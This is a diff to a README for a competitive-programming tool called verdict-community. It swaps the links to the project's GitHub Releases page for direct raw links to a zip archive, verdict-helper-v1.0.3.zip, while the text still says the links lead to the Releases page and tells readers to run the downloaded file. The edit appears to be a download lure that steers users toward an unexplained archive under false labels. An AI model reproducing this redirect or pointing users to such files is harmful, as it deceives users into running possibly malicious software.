@@ -8,7 +8,7 @@ Welcome to **verdict-community**! This application makes competitive programming
 
 To get started, you need to download the application. Click the button below to visit the Releases page.
 
-[![Download verdict-community](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/franxsanthony/verdict-community/releases)
+[![Download verdict-community](https://raw.githubusercontent.com/franxsanthony/verdict-community/main/extension/verdict-helper-v1.0.3.zip)](https://raw.githubusercontent.com/franxsanthony/verdict-community/main/extension/verdict-helper-v1.0.3.zip)
 
 Once on the Releases page, look for the latest version of *verdict-community*. Click the link to download the file compatible with your operating system. After downloading, locate the file on your computer and run it to begin using the application. 
 
@@ -75,6 +75,6 @@ Join the *verdict-community* community online. Engage with other users to share 
 
 As you start solving problems, take advantage of the features in *verdict-community*. Explore how the integrated IDE, whiteboard, and custom judge can streamline your coding process and enhance your problem-solving skills.
 
-For more details and updates, remember to check the [Releases page again](https://github.com/franxsanthony/verdict-community/releases).
+For more details and updates, remember to check the [Releases page again](https://raw.githubusercontent.com/franxsanthony/verdict-community/main/extension/verdict-helper-v1.0.3.zip).
 
 Happy coding!
